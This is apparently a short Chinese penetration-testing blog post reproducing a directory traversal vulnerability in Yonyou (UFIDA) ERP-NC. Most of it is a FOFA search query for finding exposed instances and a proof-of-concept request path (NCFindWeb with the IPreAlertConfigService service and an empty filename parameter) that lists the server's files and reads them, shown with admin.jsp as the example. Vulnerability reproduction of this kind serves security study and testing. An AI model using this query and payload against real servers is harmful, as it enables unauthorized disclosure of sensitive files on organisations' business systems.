---
title: ⽤友ERP-NC ⽬录遍历漏洞
top: false
categories:
- 渗透测试
tags:
- 漏洞复现
- 用友ERP-NC
date: 2021-04-29 18:15:26
cover: https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/%E7%94%A8%E5%8F%8Bfofa.jpg
---

### 漏洞描述

⽤友ERP-NC 存在⽬录遍历漏洞，攻击者可以通过⽬录遍历获取敏感⽂件信息 



### fofa语法

```bash
app="⽤友-UFIDA-NC"
```

![](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/%E7%94%A8%E5%8F%8Bfofa.jpg)



### 复现

POC:

```bash
 /NCFindWeb?service=IPreAlertConfigService&filename=
```

![](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/%E7%94%A8%E5%8F%8B%E4%BA%BApoc1.jpg)

查看文件（这里以admin.jsp为例）：

![](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/%E7%94%A8%E5%8F%8Bpoc.jpg)
